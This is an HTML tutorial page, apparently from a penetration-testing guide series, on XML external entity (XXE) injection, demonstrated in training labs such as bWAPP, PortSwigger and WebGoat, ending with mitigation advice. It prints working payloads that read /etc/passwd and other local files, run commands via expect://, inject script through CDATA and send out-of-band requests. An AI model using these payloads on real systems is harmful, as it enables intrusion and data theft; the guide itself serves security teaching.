@@ -1,0 +1,497 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<style>
+body {
+  font-family: "Lato", sans-serif;
+}
+
+.sidenav {
+  height: 100%;
+  width: 230px;
+  position: fixed;
+  z-index: 1;
+  top: 0;
+  left: 0;
+  background-color: #111;
+  overflow-x: scroll;
+  padding-top: 20px;
+}
+
+.main {
+        height: 100%;
+        width: 1010px;
+        position: fixed;
+        z-index: 1;
+        top: 0;
+        left: 0;
+        background-color: #fff;
+        overflow-x: fixed;
+        overflow-y: scroll;
+        padding-top: 0px;
+	float: center;
+    }
+
+
+.sidenav a {
+  padding: 6px 8px 6px 16px;
+  text-decoration: none;
+  font-size: 15px;
+  color: white;
+  display: block;
+}
+
+.sidenav a:hover {
+  color: red;
+}
+
+.main {
+  margin-left: 240px; /* Same as the width of the sidenav */
+  font-size: 30px; /* Increased text to enable scrolling */
+  padding: 0px 10px;
+}
+
+@media screen and (max-height: 450px) {
+  .sidenav {padding-top: 15px;}
+  .sidenav a {font-size: 18px;}
+}
+</style>
+</head>
+<body>
+<div class="sidenav">
+<a href="1.html">🌐【WordPress Penetration Testing】🖧</a>
+  <a href="2.html">🌐【PenTesting Lab Setup: Squid Proxy &  Burpsuite Payloads】🖧</a>
+  <a href="3.html">🌐【Beginner Guide to Google Dorks】🖧</a>
+  <a href="4.html">🌐【Introduction to Command Injection】🖧</a>
+ <a href="5.html">🌐【WebServer Shell-ing through PhpMyAdmin】🖧</a>
+  <a href="6.html">🌐【Comprehensive Guide on FFUF & HTTPX】🖧</a>
+  <a href="7.html">🌐【Comprehensive Guide on HTML & XXE Injection】🖧</a>
+<a href="8.html">🌐【NetCat for PenTesting & Web Framework Reverse Shell】🖧</a>
+  <a href="9.html">🌐【Web Shells Penetration Testing】🖧</a>
+  <a href="10.html">🌐【Database Penetration Testing】🖧</a>
+ <p align="center"><img src="https://pwa-audio-player.digitalskeleton.com.ng/p.jpg" height="90" width="200"></p>
+</div>
+<div class="main">
+<div class="markdown-heading" dir="auto">
+<h3 class="heading-element" dir="auto" tabindex="-1"><p align="left">🌐Comprehensive Guide on HTML & XXE Injection🖧</p></h3>
+<p><strong>XML</strong>&nbsp;is a markup language that is commonly used in web development. It is used for storing and transporting data. So,  in this guide, we will learn how an attacker can use this vulnerability to gain the information and try to defame web-application.</p>
+<h3><strong>XXE Testing Methodology:</strong></h3>
+<ul>
+<li>Introduction to XML</li>
+<li>Introduction to XXE Injection</li>
+<li>Impacts</li>
+<li>XXE for SSRF
+<ul>
+<li>Local File</li>
+<li>Remote File</li>
+</ul>
+</li>
+<li>XXE Billion Laugh Attack</li>
+<li>XXE using file upload</li>
+<li>Remote Code Execution</li>
+<li>XSS via XXE</li>
+<li>JSON and Content Manipulation</li>
+<li>Blind XXE</li>
+<li>Mitigation Steps</li>
+</ul>
+<h3><strong>Introduction to XML</strong></h3>
+<p><strong><u>What are XML and Entity?</u></strong></p>
+<p><em>XML stands for &ldquo;E<strong>x</strong>tensible&nbsp;<strong>M</strong>arkup&nbsp;<strong>L</strong>anguage&rdquo;,It is the most common language for storing and transporting data.</em>&nbsp;It is a self-descriptive language. It does not contain any predefined tags like &lt;p&gt;, &lt;img&gt;, etc. All the tags are user-defined depending upon the data it is representing for example. &lt;email&gt;&lt;/email&gt;, &lt;message&gt;&lt;/message&gt; etc.</p>
+<p><img src="https://1.bp.blogspot.com/-IFB_6Q-FDnk/X7ZlNExNX7I/AAAAAAAAqy0/_OUivmJyt-wiqbKWQRHo66sW3SBk5F6AgCLcBGAsYHQ/s16000/0.png" alt="" /></p>
+<ul>
+<li><strong>Version:</strong>&nbsp;It is used to specify what version of XML standard is being used.
+<ul>
+<li><strong>Values:&nbsp;</strong>1<strong>.</strong>0</li>
+</ul>
+</li>
+<li><strong>Encoding:&nbsp;</strong>It is declared to specify the encoding to be used. The default encoding that is used in XML is&nbsp;<strong>UTF-8.</strong>
+<ul>
+<li><strong>Values:&nbsp;</strong>UTF-8, UTF-16, ISO-10646-UCS-2, ISO-10646-UCS-4, Shift_JIS, ISO-2022-JP, ISO-8859-1 to ISO-8859-9, EUC-JP</li>
+</ul>
+</li>
+<li><strong>Standalone:&nbsp;</strong>It informs the parser if the document has any link to an external source or there is any reference to an external document. The default value is no.
+<ul>
+<li><strong>Values:&nbsp;</strong>yes, no</li>
+</ul>
+</li>
+</ul>
+<h3><strong><u>What is an Entity?</u></strong></h3>
+<p>Like there are variables in programming languages we have XML Entity. They are the way of representing data that are present inside an XML document. There are various built-in entities in XML language like &amp;lt; and &amp;gt; which are used for less than and greater than in XML language. All of these are metacharacters that are generally represented using entities that appear in data. XML external entities are the entities that are located outside DTD.</p>
+<p>The declaration of an external entity uses the SYSTEM keyword and must specify a URL from which the value of the entity should be loaded. For example</p>
+<pre class="lang:default decode:true">&lt;!ENTITY ignite SYSTEM "URL"&gt;</pre>
+<p>In this syntax&nbsp;<strong>Ignite</strong>&nbsp;is the name of the entity,</p>
+<p><strong>SYSTEM&nbsp;</strong>is the keyword used,</p>
+<p><strong>URL</strong>&nbsp;is the URL that we want to get by performing an XXE attack.</p>
+<h3><strong><u>What is the Document Type Definition (DTD)?</u></strong></h3>
+<p>It is used for declaration of the structure of XML document, types of data value that it can contain, etc. DTD can be present inside the XML file or can be defined separately. It is declared at the beginning of XML using &lt;!DOCTYPE&gt;.</p>
+<p>There are several types of DTDs and the one we are interested in is external DTDs.&nbsp;</p>
+<p><strong>SYSTEM:&nbsp;</strong>The system&nbsp;identifier enables us to specify the external file location that contains the DTD declaration.</p>
+<pre class="lang:default decode:true">&lt;!DOCTYPE ignite SYSTEM "URL" [...] &gt;</pre>
+<p><strong>PUBLIC:&nbsp;</strong>Public identifiers provide a mechanism to locate DTD resources and are written as below &minus;</p>
+<p>As you can see, it begins with the keyword PUBLIC, followed by a specialized identifier. Public identifiers are used to identify an entry in a catalog.</p>
+<pre class="lang:default decode:true">&lt;!DOCTYPE raj PUBLIC "URL"</pre>
+<h3><strong>Introduction to XXE</strong></h3>
+<p>An XXE is a type of attack that is performed against an application in order to parse its XML input. In this attack XML input containing a reference to an external entity is processed by a weakly configured XML parser.&nbsp; Like in Cross-Site Scripting (XSS) we try to inject scripts similarly in this we try to insert XML entities to gain crucial information.</p>
+<p>It is used for declaration of the structure of XML document, types of data value that it can contain, etc. DTD can be present inside the XML file or can be defined separately. It is declared at the beginning of XML using &lt;!DOCTYPE&gt;.</p>
+<p>There are several types of DTDs and the one we are interested in is external DTDs. There are two types of external DTDs:</p>
+<ol>
+<li><strong>SYSTEM:&nbsp;</strong>System identifier enables us to specify the external file location that contains the DTD declaration</li>
+</ol>
+<p><img src="https://1.bp.blogspot.com/-Zvx6Sfo3s-A/X7ZlUL60k3I/AAAAAAAAqy4/QSTW-ubiJCcUSwefj_u4UfRrVG_mVnj4wCLcBGAsYHQ/s16000/1.0.png" alt="" /></p>
+<p>In this XML external entity payload is sent to the server and the server sends that data to an XML parser that parses the XML request and provides the desired output to the server. Then server returns that output to the attacker.</p>
+<h3><strong>Impacts</strong></h3>
+<p>XML External Entity (XXE) can possess a severe threat to a company or a web developer. XXE has always been in Top 10 list of OWASP. It is common as lots of website uses XML in the string and transportation of data and if the countermeasures are not taken then this information will be compromised. Various attacks that are possible are:</p>
+<ul>
+<li>Server-Side Request Forgery</li>
+<li>DoS Attack</li>
+<li>Remote Code Execution</li>
+<li>Cross-Site Scripting</li>
+</ul>
+<p>The CVSS score of XXE is&nbsp;<strong>7.5</strong>&nbsp;and its severity is&nbsp;<strong>Medium&nbsp;</strong>with &ndash;</p>
+<ul>
+<li><strong>CWE-611:&nbsp;</strong>Improper Restriction of XML External Entity.</li>
+<li><strong>CVE-2019-12153:</strong>&nbsp;Local File SSRF</li>
+<li><strong>CVE-2019-12154:</strong>&nbsp;Remote File SSRF</li>
+<li><strong>CVE-2018-1000838:</strong>&nbsp;Billion Laugh Attack</li>
+<li><strong>CVE-2019-0340:</strong>&nbsp;XXE via File Upload</li>
+</ul>
+<h3><strong>Performing XXE Attack to perform SSRF:</strong></h3>
+<p>Server-Side Request Forgery (SSRF) is a web vulnerability where the hacker injects server-side HTML codes to get control over the site or to redirect the output to the attacker&rsquo;s server. File types for SSRF attacks are &ndash;</p>
+<p><strong>Local File:</strong></p>
+<p>These are the files that are present on the website domain like robots.txt, server-info, etc. So, let&rsquo;s use &ldquo;bWAPP&rdquo; to perform an XXE attack at a level set to&nbsp;<strong>low</strong>.</p>
+<p><img src="https://1.bp.blogspot.com/-t4lQV40hX-U/X7Zla6o7pII/AAAAAAAAqy8/RFLThTN9qGwDF8qrp7jIVOnyKFYl3km9QCLcBGAsYHQ/s16000/1.png" alt="" /></p>
+<p>Now we will fire up our BurpSuite and intercept after pressing Any Bugs? button and we will get the following output on burp:</p>
+<p><img src="https://1.bp.blogspot.com/-uLN9WjRyR2M/X7ZlgOz2XsI/AAAAAAAAqzE/JfeOXwxnM6QyBOnSuGRX1XrCBESbC5hhgCLcBGAsYHQ/s16000/2.png" alt="" /></p>
+<p>We can see that there is no filter applied so XXE is possible so we will send it to the repeater and there we will perform our attack.&nbsp; We will try to know which field is vulnerable or injectable because we can see there are two 0 fields i.e.,&nbsp;<strong>login and secret.</strong></p>
+<p>So, we will test it as follows:</p>
+<p><img src="https://1.bp.blogspot.com/-X_FUE6C_PBY/X7ZlkeI7QTI/AAAAAAAAqzI/uEKfxJX8uTwqHo9789MtJmT0MRevrJhhwCLcBGAsYHQ/s16000/3.png" alt="" /></p>
+<p>In the repeater tab, we will send the default request and observe the output in the response tab.</p>
+<p><img src="https://1.bp.blogspot.com/-b4cIfu8y_zA/X7ZmvcsXO3I/AAAAAAAAqz4/DLQsRuJv5UID91KlLX6tKVJnOIhiHgVpQCLcBGAsYHQ/s16000/4.png" alt="" /></p>
+<p>It says&nbsp;<strong><em>&ldquo;bee&rsquo;s secret has been reset&rdquo;&nbsp;</em></strong>so it seems that login is injectable but let&rsquo;s verify this by changing it from bee and then sending the request.</p>
+<p><img src="https://1.bp.blogspot.com/-EC3ozBnUfKI/X7Zm0V7vegI/AAAAAAAAqz8/gXL6OO-XYAU9dYBcba4luZS0Mosx7q8qQCLcBGAsYHQ/s16000/5.png" alt="" /></p>
+<p>Now again we will be observing its output in response tab:</p>
+<p><img src="https://1.bp.blogspot.com/-wDraDJJCQPQ/X7Zm7peB8AI/AAAAAAAAq0A/SxRWKt5SV482mU0wIimvXjuwAUGdjsstACLcBGAsYHQ/s16000/6.png" alt="" /></p>
+<p>We got the output&nbsp;<strong><em>&ldquo;ignite&rsquo;s secret has been reset&rdquo;&nbsp;&nbsp;</em></strong>so it makes it clear that login is injectable. Now we will perform our attack.</p>
+<p>Now as we know which field is injectable, let&rsquo;s try to get the robots.txt file. And for this, we&rsquo;ll be using the following payload &ndash;</p>
+<pre class="lang:default decode:true">&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;!DOCTYPE reset [
+&lt;!ENTITY ignite SYSTEM "http://192.168.1.15/bWAPP/robots.txt"&gt;
+]&gt;
+&lt;reset&gt;&lt;login&gt;&amp;ignite;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;</pre>
+<p>Understanding the payload</p>
+<p>We have declared a doctype with the name &ldquo;<strong><em>reset&rdquo;&nbsp;</em></strong>and then inside that declared an entity named &ldquo;<strong><em>ignite&rdquo;</em></strong>. We are using SYSTEM identifier and then entering the URL to robots.txt. Then in login, we are entering &ldquo;<strong><em>&amp;ignite;&rdquo;&nbsp;</em></strong>to get the desired information<strong><em>.</em></strong></p>
+<p><img src="https://1.bp.blogspot.com/-rJgRpAyZbTs/X7ZnBBFVcgI/AAAAAAAAq0I/tcQBh1teUEghW0XgPN2Jy04qaGmkB7F0wCLcBGAsYHQ/s16000/7.png" alt="" /></p>
+<p>After inserting the above code, we will click on send and will get output like below in the response tab:</p>
+<p><img src="https://1.bp.blogspot.com/-wR4Y6GARWQ4/X7Znb4fsB0I/AAAAAAAAq0g/4gdrFvXZyW4aqMqcjvy6U8EbeHr3twfLACLcBGAsYHQ/s16000/8.png" alt="" /></p>
+<p>We can see in the above output that we got all the details that are present in the robots.txt. This tells us that SSRF of the local file is possible using XXE.</p>
+<p><img src="https://1.bp.blogspot.com/-baEigIsJ4ZE/X7ZnUfoSzeI/AAAAAAAAq0Y/RRBtoDDRIvgT6EzAi1v67AvR9q5PUBheQCLcBGAsYHQ/s16000/9.0.png" alt="" /></p>
+<p>So now, let&rsquo;s try to understand how it all worked. Firstly, we will inject the payload and it will be passed on to the server and as there are no filters present to avoid XXE the server sends the request to an XML parser and then sends the output of the parsed XML file. In this case, robots.txt was disclosed to the attacker using XML query.</p>
+<p><strong>Remote File:</strong></p>
+<p>These are the files that attacker injects a remotely hosted malicious scripts in order to gain admin access or crucial information. We will try to get&nbsp;<strong>/etc/passwd</strong>&nbsp;for that we will enter the following command.</p>
+<pre class="lang:default decode:true">&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;!DOCTYPE reset [
+&lt;!ENTITY ignite SYSTEM "file:///etc/passwd"&gt;
+]&gt;&lt;reset&gt;&lt;login&gt;&amp;ignite;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;</pre>
+<p><img src="https://1.bp.blogspot.com/-RkalIRYAhA0/X7ZnjBXWIiI/AAAAAAAAq0k/b2_dwP9J1pgGJ6GbGJVW1zRdwavX699ugCLcBGAsYHQ/s16000/9.png" alt="" /></p>
+<p>After entering the above command as soon as we hit the send button we&rsquo;ll be reflected with the passwd file !!</p>
+<p><img src="https://1.bp.blogspot.com/-0qCfKVPIoCY/X7Znq0t4aaI/AAAAAAAAq0s/IB_wNIq_KH04X0iLsoyOuxrsNtWNMrc2gCLcBGAsYHQ/s16000/10.png" alt="" /></p>
+<h3><strong>XXE Billion Laugh Attack-DOS</strong></h3>
+<p>These are aimed at XML parsers in which both, well-formed and valid, XML data crashes the system resources when being parsed. This attack is also known as XML bomb or XML DoS or exponential entity expansion attack.</p>
+<p>Before performing the attack, lets know&nbsp;<strong>why it is known as Billion Laugh Attack?</strong></p>
+<p><em>&ldquo;For the first time when this attack was done, the attacker used lol as the entity data and the called it multiple times in several following entities. It took exponential amount of time to execute and its result was a successful DoS attack bringing the website down. Due to usage of lol and calling it multiple times that resulted in billions of requests we got the name Billion Laugh Attack&rdquo;</em></p>
+<p><img src="https://1.bp.blogspot.com/-rgGWJLmhSmk/X7Zn2b06pQI/AAAAAAAAq00/GzrhzC8xGIsbT4B8IXVkMYOtPfwB4uBEQCLcBGAsYHQ/s16000/11.0.png" alt="" /></p>
+<p>Before using the payload lets understand it:</p>
+<p>In this, we see that at&nbsp;<strong>1</strong>&nbsp;we have declared the entity named &ldquo;<strong><em>ignite&rdquo;&nbsp;</em></strong>and then calling ignite in several other entities thus forming a chain of callbacks which will overload the server.&nbsp; At&nbsp;<strong>2&nbsp;</strong>we have called entity&nbsp;<strong><em>&amp;ignite9;</em></strong>&nbsp;We have called ignite9 instead of ignite as ignite9 calls ignite8 several times and each time ignite8 is called ignite7 is initiated and so on. Thus, the request will take an exponential amount of time to execute and as a result, the website will be down.</p>
+<p>Above command results in DoS attack and the output that we got is:</p>
+<p><img src="https://1.bp.blogspot.com/-Hlu92_RAx00/X7Zn_HkZNCI/AAAAAAAAq08/u3A85qVheHESJhD5Jo5Er8LYL9EJvJifgCLcBGAsYHQ/s16000/11.png" alt="" /></p>
+<p>Now after entering the XML command we will not see any output in response field and also bee box is not accessible and it will be down.</p>
+<p><img src="https://1.bp.blogspot.com/-NmTgsO0p1dY/X7ZoHIwwPeI/AAAAAAAAq1E/JbHf7qrO3C8W11Vo05Hc_vxn8UKgoLU0QCLcBGAsYHQ/s16000/12.png" alt="" /></p>
+<h3><strong>XXE Using File Upload</strong></h3>
+<p>XXE can be performed using the file upload method. We will be demonstrating this using Port Swigger lab&nbsp;<strong>&ldquo;Exploiting XXE via Image Upload&rdquo;.</strong>&nbsp;The payload that we will be using is:</p>
+<pre class="lang:default decode:true">&lt;?XML version="1.0" standalone="yes"?&gt;
+&lt;!DOCTYPE reset [
+&lt;!ENTITY xxe SYSTEM "file:///etc/hostname"&gt; ] &gt;
+&lt;svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"&gt;
+&lt;text font-size="40" x="0" y="100"&gt;&amp;xxe;&lt;/text&gt;
+&lt;/svg&gt;</pre>
+<p><strong>Understanding the payload:&nbsp;</strong>We will be making an SVG file as only image files are accepted by the upload area. The basic syntax of the SVG file is given above and in that, we have added a text field that will</p>
+<p>We will be saving the above code as&nbsp;<strong>&ldquo;payload.svg&rdquo;.</strong>&nbsp;Now on portswigger, we will go on a post and comment and then we will add the made payload in the avatar field.</p>
+<p><img src="https://1.bp.blogspot.com/-Gc7KmcKvccc/X7ZoMY0pKBI/AAAAAAAAq1I/1CykhDJOveoFKtnoABugZnYa25PL_imPgCLcBGAsYHQ/s16000/13.png" alt="" /></p>
+<p>Now we will be posting the comment by pressing Post Comment button. After this, we will visit the post on which we posted our comment, and we will see our comment in the comments section.</p>
+<p><img src="https://1.bp.blogspot.com/-AniSeuufigQ/X7ZoTmjeZnI/AAAAAAAAq1Q/Y2SfaHc3fPUsGWxk-1tAe3dWD7vhX1mswCLcBGAsYHQ/s16000/14.png" alt="" /></p>
+<p>Let&rsquo;s check its page source in order to find the comment that we posted. You will find somewhat similar to what I got below</p>
+<p><img src="https://1.bp.blogspot.com/-4ypLV8-P6F4/X7Zoa31_95I/AAAAAAAAq1U/E-5ufOGALnQu5nFKVzexqytITlbhf-qIACLcBGAsYHQ/s16000/15.png" alt="" /></p>
+<p>We will be clicking on the above link and we will get the flag in a new window as follows:</p>
+<p><img src="https://1.bp.blogspot.com/-oFIK8gcRmtI/X7Zofk3_EoI/AAAAAAAAq1c/WTIO3ZbakfEwB61Auo9vK_Md6SyhCwjmwCLcBGAsYHQ/s16000/16.png" alt="" /></p>
+<p>This can be verified by submitting the flag and we will get the success message.</p>
+<p><img src="https://1.bp.blogspot.com/-s6evfpJCk-M/X7ZomzE1_hI/AAAAAAAAq1k/e98RRhoK3_Mrf0MXggzQK__EPtsApfM_wCLcBGAsYHQ/s16000/17.png" alt="" /></p>
+<p><img src="https://1.bp.blogspot.com/-cJnaati0ueU/X7Zos4EAaYI/AAAAAAAAq1s/msx-ybVIkv0Eb8YpQgOI_XuCbZvwd9ciACLcBGAsYHQ/s16000/18.png" alt="" /></p>
+<p><img src="https://1.bp.blogspot.com/-axlOa6EX8Pc/X7ZoyQz9bWI/AAAAAAAAq1w/1cM9qQqHgeIPlHl7rMj1R8Vx5H1Zj3iXQCLcBGAsYHQ/s16000/19.png" alt="" /></p>
+<p><strong>Understanding the whole concept:&nbsp;</strong>So, when we uploaded the payload in the avatar field and filled all other fields too our comment was shown in the post. Upon examining the source file, we got the path where our file was uploaded. We are interested in that field as our XXE payload was inside that SVG file and it will be containing the information that we wanted, in this case, we wanted&rdquo;<strong><em>/etc/domain&rdquo;.&nbsp;</em></strong>After clicking on that link, we were able to see the information.</p>
+<h3><strong>XXE to Remote code Execution</strong></h3>
+<p>Remote code execution is a very server web application vulnerability. In this an attacker is able to inject its malicious code on the server in order to gain crucial information. To demonstrate this attack I have used<strong>&nbsp;<u>XXE LAB</u></strong>. We will follow below steps to download this lab and to run this on our Linux machine:</p>
+<pre class="lang:default decode:true">git clone https://github.com/jbarone/xxelab.git
+cd xxelab
+vagrant up</pre>
+<p>In our terminal we will get somewhat similar output as following:</p>
+<p><img src="https://1.bp.blogspot.com/-CGkfWaYOXzM/X7Zo4_CBmAI/AAAAAAAAq10/9QOSpe4oAQI6j3GenlA4Bpfz3nMe7KI-ACLcBGAsYHQ/s16000/20.png" alt="" /></p>
+<p>Now once it&rsquo;s ready to be use we will open the browser and type:&nbsp;<u><strong>http://192.168.33.10/</strong></u>&nbsp;and we will see the site looks like this:</p>
+<p><img src="https://1.bp.blogspot.com/-3YjPUvWyPrs/X7Zo-X6E8PI/AAAAAAAAq18/KBvMStSXrY0TraFnEM5vCwfkLE6CsAzDQCLcBGAsYHQ/s16000/21.png" alt="" /></p>
+<p>We will be entering our details and intercepting the request using Burp Suite. In Burp Suite we will see the request as below:<br /><img src="https://1.bp.blogspot.com/-l1NZQV2YV_g/X7ZpDZ6M0WI/AAAAAAAAq2A/uT_uTaYMfo4eFHctaFDRgvIKRnim80mNwCLcBGAsYHQ/s16000/22.png" alt="" /></p>
+<p>We will send this request to repeater and we will see which field is vulnerable. So, firstly we will send the request as it is and observe the&nbsp; response tab:</p>
+<p><img src="https://1.bp.blogspot.com/-lhMZWbxh-eE/X7ZpIU4Xk1I/AAAAAAAAq2E/cdQ2az3rUEgUTPuvqG48OGYc0MWQZlEVwCLcBGAsYHQ/s16000/23.png" alt="" /></p>
+<p>We can notice that we see only email so we will further check with one more entry to verify that this field is the vulnerable one among all the fields.</p>
+<p><img src="https://1.bp.blogspot.com/-o_WmFjCFjtQ/X7ZpOFcetxI/AAAAAAAAq2I/G4283E7y4IQDIb__--WTmb_vSxFcIRivgCLcBGAsYHQ/s16000/24.png" alt="" /></p>
+<p>From the above screenshot it&rsquo;s clear that the email field is vulnerable. Now we will enter our payload:</p>
+<pre class="lang:default decode:true">&lt;!DOCTYPE root [
+&lt;!ENTITY ignite SYSTEM "expect://id"&gt; ]&gt;</pre>
+<p>Lets understand the payload before implementing it:</p>
+<p>We have created a doctype with the name &rdquo;<strong><em>root</em></strong>&rdquo; and under that, we created an entity named &ldquo;<strong><em>ignite</em></strong>&rdquo; which is asking for &ldquo;expect://id&rdquo;. If expect is being accepted in a php page then remote code execution is possible. We are fetching the id so we used &ldquo;id&rdquo; in this case.</p>
+<p>And we can see that we got the uid,gid and group number successfully. This proves that our remote code execution was successful in this case.</p>
+<p><strong><img src="https://1.bp.blogspot.com/-1y_M-zhU4oc/X7Zpbf7z8pI/AAAAAAAAq2Y/Gwwqs7127ZsWMao5NzfSOl8Io1r64Y5ggCLcBGAsYHQ/s16000/25.png" alt="" /></strong><strong>&nbsp;</strong></p>
+<h3><strong>XSS via XXE</strong></h3>
+<p>Nowadays we can see that scripts are blocked by web applications so there is a way of trespassing this. We can use the&nbsp;<strong>CDATA</strong>&nbsp;of&nbsp;<strong>XML</strong>&nbsp;to carry out this attack. We will also see CDATA in our mitigation step. We have used the above XXE LAB to perform XSS. So, we have the same intercepted request as in the previous attack and we know that the email field is vulnerable so we will be injecting our payload in that field only. Payload that we gonna use is as below:</p>
+<pre class="lang:default decode:true ">&lt;![CDATA[&lt;]]&gt;img src="" onerror=javascript:alert(1)&lt;![CDATA[&gt;]]&gt;</pre>
+<p><strong>Understanding the payload:&nbsp;</strong>As we know that in most of the input fields&nbsp;<strong>&lt; and &gt;</strong>&nbsp;are blocked so we have included it inside the CDATA. CDATA is character data and the data inside CDATA is not parsed by XML parser and is as it is pasted in the output.<strong>&nbsp;</strong></p>
+<p>Let&rsquo;s see this attack:</p>
+<p>We will enter the above command in between the email field and we will observe the output in the response tab.</p>
+<p><img src="https://1.bp.blogspot.com/-ZY8WCVmpuo0/X7uca0wunbI/AAAAAAAArDE/isGrKnAz94EDljpRaYcm3gwUUm-i5JEEgCLcBGAsYHQ/s16000/1.png" alt="" /></p>
+<p>We can see that we have got the image tag embedded in the field with our script. We will right-click on it and select the option &ldquo;<strong>Show response in browser</strong>&rdquo;</p>
+<p><img src="https://1.bp.blogspot.com/-DJoPIELBBuE/X7uc3Ifaf_I/AAAAAAAArDM/9wgl9nDZXJIEkvW--6d--5Uno1MxCobagCLcBGAsYHQ/s16000/2.png" alt="" /></p>
+<p>We will copy the above link and paste it in the browser and we will be shown an alert box saying &ldquo;1&rdquo; as we can observe in the below screenshot.</p>
+<p><img src="https://1.bp.blogspot.com/-HwZaQlgKdiU/X7udBXyZrkI/AAAAAAAArDQ/Z5ctiWofDuslXmMr-2S3NehfFZs8re4XACLcBGAsYHQ/s16000/3.png" alt="" /></p>
+<p>So, the screenshot makes us clear that we were able to do Cross-Site Scripting using XML.</p>
+<h3><strong>JSON and Content Manipulation</strong></h3>
+<p>JSON is JavaScript Object Notation which is also used for storing and transporting data like XML. We can convert JSON to XML and still get the same output as well as get some juicy information using it. We can also do content manipulation so that XML can be made acceptable. We will be using&nbsp;<strong>WebGoat&nbsp;</strong>for this purpose. In WebGoat we will be performing an XXE attack.</p>
+<p><img src="https://1.bp.blogspot.com/-nQhMDHxfwEE/X7udPh8wsqI/AAAAAAAArDU/d5st1Sz97EY3djVeFmTagr45c1emU3NQQCLcBGAsYHQ/s16000/4.png" alt="" /></p>
+<p><img src="https://1.bp.blogspot.com/-IgpiBRqi_14/X7udf6m35aI/AAAAAAAArDc/6TdeW15oECQao4pp3DjV71S4FSEOjbJvwCLcBGAsYHQ/s16000/5.png" alt="" /></p>
+<p>We can see that the intercepted request looks like above. We will change its content-type and replace JSON with XML code. XML code that we will be using is:</p>
+<pre class="lang:default decode:true">&lt;?xml?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY ignite SYSTEM "file:///"&gt;
+]&gt;
+&lt;comment&gt;
+&lt;text&gt;
+&amp;ignite;
+&lt;/text&gt;
+&lt;/comment&gt;</pre>
+<p><img src="https://1.bp.blogspot.com/-b-yW2wQBfzY/X7udowpjYWI/AAAAAAAArDg/-HLpX1A3j4swAoSxy0c3PqjpCSekbuFHgCLcBGAsYHQ/s16000/6.png" alt="" /></p>
+<p>We will be observing that our comment will be posted with the root file.</p>
+<p><img src="https://1.bp.blogspot.com/-hczk-pw-LLk/X7udtltmQxI/AAAAAAAArDk/uxmZ7RkmXEk_79kJePbKkNTNxE9XvsxawCLcBGAsYHQ/s16000/7.png" alt="" /></p>
+<p>So in this, we learnt how we can perform XML injection on JSON fields and also how we can pass XML by manipulating its content-type.</p>
+<p><strong>Let us understand what happened above:</strong></p>
+<p>JSON is the same as XML language so we can get the same output using XML as we will expect from a JSON request. In the above, we saw that JSON has text value so we replaced the JSON request with the above payload and got the root information. If we would have not changed its content type to application/XML then our XML request would not have been passed.</p>
+<h3><strong>Blind XXE</strong></h3>
+<p>As we have seen in the above attacks we were seeing which field is vulnerable. But, when there is a different output on our provided input then we can use Blind XXE for this purpose. We will be using portswigger lab for demonstrating Blind XXE. For this, we will be using burp collaborator which is present in BurpSuite professional version only. We are using a lab named &ldquo;<strong><em>Blind XXE with out-of-band interaction via XML parameter Entities</em></strong>&rdquo;. When we visit the lab we will see a page like below:</p>
+<p><img src="https://1.bp.blogspot.com/-LQPjDz7Lt50/X7ud5hBuwJI/AAAAAAAArDw/fa63RKSYyoQWE7_EMyhpdPZpVxBRQhu9ACLcBGAsYHQ/s16000/8.png" alt="" /></p>
+<p>We will click on View details and we will be redirected to the below page in which we will be intercepting the &ldquo;<strong><em>check stock&rdquo;</em></strong>&nbsp;request.</p>
+<p><img src="https://1.bp.blogspot.com/-EMpXd2rOt_w/X7ueDlwZujI/AAAAAAAArD4/_Sn1m5wBRIgJ0lk0TbaoAFxM8gzhCdYuwCLcBGAsYHQ/s16000/9.png" alt="" /></p>
+<p>We will be getting intercepted request as below:</p>
+<p><img src="https://1.bp.blogspot.com/-Y1bpH7qohc8/X7ueJPsLqbI/AAAAAAAArD8/nt3x7nXV-iIsJ3AkIosGmuqISjcoLl3NQCLcBGAsYHQ/s16000/10.png" alt="" /></p>
+<p>We can see that if we normally send the request we will get the number of stocks. Now we will fire up the burp collaborator from the burp menu and we will see the following window.</p>
+<p><img src="https://1.bp.blogspot.com/--UFf1T4wn14/X7ueSPZjLnI/AAAAAAAArEE/J-QZ44ShTpAosA2dR11gtTe6fMcKZb37QCLcBGAsYHQ/s16000/11.png" alt="" /></p>
+<p>In this, we will press the &ldquo;<strong>copy to clipboard&rdquo;</strong>&nbsp;button to copy the burp subdomain that we will be using in our payload.</p>
+<p>Payload that we will be using is as below:</p>
+<pre class="lang:default decode:true">&lt;!DOCTYPE stockCheck [
+&lt;!ENTITY % ignite SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net"&gt; %ignite; ]&gt;</pre>
+<p>Now we will see in Burp Collaborator, we will see that we capture some request which tells us that we have performed Blind XXE successfully.<img src="https://1.bp.blogspot.com/-Or5suh5ubRk/X7ueb6sLm-I/AAAAAAAArEM/qdygOLk9G6M4rwP7SwX0n6OGjAYorJ63ACLcBGAsYHQ/s16000/12.png" alt="" /></p>
+<p><img src="https://1.bp.blogspot.com/-1xpvwoYkuDk/X7ue7MF9TjI/AAAAAAAArEU/5BWHfYc5q0MLS9-ySEOAeIlIifmgeNWrgCLcBGAsYHQ/s16000/13.png" alt="" /></p>
+<p>We will also verify that our finding is correct and we will see in the lab that we have solved it successfully.</p>
+<p><strong><img src="https://1.bp.blogspot.com/-UOgJqj5ULgQ/X7ufB3BK3dI/AAAAAAAArEY/NOkEYdtNgkY6FGfxs4pJWPlT889pzXHsgCLcBGAsYHQ/s16000/14.png" alt="" />&nbsp;</strong></p>
+<h3><strong>Mitigation Steps</strong></h3>
+<ul>
+<li>The safest way to prevent XXE is always to disable DTDs (External Entities) completely. Depending on the parser, the method should be similar to the following:</li>
+</ul>
+<pre class="lang:default decode:true">factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);</pre>
+<ul>
+<li>Also, DoS attacks can be prevented by disabling DTD. If it is not possible to disable DTDs completely, then external entities and external document type declarations must be disabled in the way that&rsquo;s specific to each parser.</li>
